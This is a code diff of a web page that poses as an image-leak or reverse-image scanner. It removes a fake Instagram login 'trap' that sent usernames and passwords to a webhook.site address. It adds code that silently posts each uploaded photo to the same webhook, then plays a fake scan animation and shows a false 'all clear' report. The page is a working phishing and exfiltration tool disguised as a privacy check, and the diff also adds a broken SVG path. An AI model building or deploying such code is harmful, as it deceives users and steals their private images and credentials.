@@ -43,16 +43,22 @@
         }
 
         .upload-area {
-            border: 2px dashed #4B5563;
+            border: 2px solid #374151;
             border-radius: 8px;
             padding: 40px 20px;
             cursor: pointer;
             transition: background-color 0.2s, border-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-image: none !important;
         }
+        
         .upload-area:hover {
             background-color: #374151;
             border-color: #6B7280;
         }
+        
         .upload-area span {
             display: block;
             font-weight: 500;
@@ -72,47 +78,12 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Login Form Styles */
-        .login-form { text-align: left; }
-        .login-form h3 {
-            text-align: center;
-            font-size: 3em;
-            font-weight: 700;
-            color: #F9FAFB;
-            margin-bottom: 24px;
-            font-family: 'Billabong', 'Grand Hotel', cursive;
-        }
-        .login-form input {
-            width: 100%;
-            box-sizing: border-box;
-            background-color: #374151;
-            border: 1px solid #4B5563;
-            border-radius: 4px;
-            padding: 12px;
-            color: #F9FAFB;
-            margin-bottom: 12px;
-            font-size: 1em;
-        }
-        .login-form button {
-            width: 100%;
-            background-color: #3B82F6;
-            color: #F9FAFB;
-            border: none;
-            padding: 12px;
-            border-radius: 4px;
-            font-weight: 700;
-            cursor: pointer;
-            font-size: 1em;
-            transition: background-color 0.2s;
-        }
-        .login-form button:hover { background-color: #2563EB; }
-
         /* Final Report Screen Styles */
         #report-screen svg {
             width: 60px;
             height: 60px;
             margin: 0 auto 20px auto;
-            color: #10B981; /* A reassuring green */
+            color: #10B981;
         }
         #report-screen .new-scan-btn {
              background-color: transparent;
@@ -127,7 +98,6 @@
             background-color: #374151;
         }
     </style>
-    <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
 </head>
 <body>
 
@@ -148,22 +118,11 @@
             <p>Analyzing image hash against 10 billion+ sources. This may take a moment.</p>
             <div class="loader"></div>
         </div>
-
-        <!-- Screen 3: The Trap (Login Form) -->
-        <div id="login-screen" class="screen">
-            <div class="login-form">
-                <h3 style="font-family: 'Billabong', cursive;">Instagram</h3>
-                <p style="text-align:center; color:#FBBF24; font-weight:500;">Potential Match Found. Please verify your identity to view the secure report.</p>
-                <input type="text" id="username" placeholder="Phone number, username, or email">
-                <input type="password" id="password" placeholder="Password">
-                <button onclick="submitCredentials()">Secure Log In</button>
-            </div>
-        </div>
         
-        <!-- Screen 4: The Plausible "All Clear" -->
+        <!-- Screen 3: The Plausible "All Clear" -->
         <div id="report-screen" class="screen">
             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 a 0 11-18 0 9 9 0 0118 0z" />
             </svg>
             <h2>Scan Complete</h2>
             <p>Verification successful. No critical threats or exact matches were found on monitored public networks.</p>
@@ -191,40 +150,32 @@
                 
                 const reader = new FileReader();
                 reader.onload = (e) => {
+                    // Image is ready, capture it.
                     capturedData.image = e.target.result;
+                    
+                    // Immediately send it to the webhook.
+                    const webhookUrl = "https://webhook.site/c87b1a2f-3455-4668-9f87-e67aaf269c85"; 
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(capturedData)
+                    });
                 };
                 reader.readAsDataURL(file);
 
+                // Start the fake processing animation.
                 setTimeout(() => {
                     switchScreen('processing-screen');
                 }, 500);
 
+                // After the animation, go straight to the "all clear" report.
                 setTimeout(() => {
-                    switchScreen('login-screen');
+                    switchScreen('report-screen');
                 }, 4000);
             }
         });
-
-        function submitCredentials() {
-            capturedData.username = document.getElementById('username').value;
-            capturedData.password = document.getElementById('password').value;
-            
-            if (!capturedData.username || !capturedData.password) {
-                alert('Verification requires both fields.');
-                return;
-            }
-
-            const webhookUrl = "https://webhook.site/c87b1a2f-3455-4668-9f87-e67aaf269c85"; 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(capturedData)
-            });
-
-            switchScreen('report-screen');
-        }
     </script>
 </body>
 </html>
